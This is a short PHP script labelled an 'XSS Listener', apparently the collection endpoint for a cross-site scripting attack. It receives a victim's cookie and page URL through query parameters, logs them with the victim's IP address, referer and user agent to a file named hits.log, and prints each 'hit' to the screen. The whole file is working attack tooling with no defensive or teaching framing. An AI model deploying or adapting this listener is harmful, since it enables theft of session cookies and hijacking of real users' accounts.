<?php
// Improved XSS Listener - Works better on GitHub Pages
$log = "=== XSS HIT ===\n";
$log .= "Time: " . date('Y-m-d H:i:s') . "\n";
$log .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
$log .= "Cookie: " . ($_GET['c'] ?? 'no_cookie') . "\n";
$log .= "URL: " . ($_GET['u'] ?? 'no_url') . "\n";
$log .= "Referer: " . ($_SERVER['HTTP_REFERER'] ?? 'none') . "\n";
$log .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown') . "\n";
$log .= "========================\n\n";

// Try to save to file
file_put_contents("hits.log", $log, FILE_APPEND);

// Also display on screen so you can see hits easily
echo "<pre>";
echo $log;
echo "</pre>";

echo "<h2>Listener is Working - Hit Received</h2>";
?>
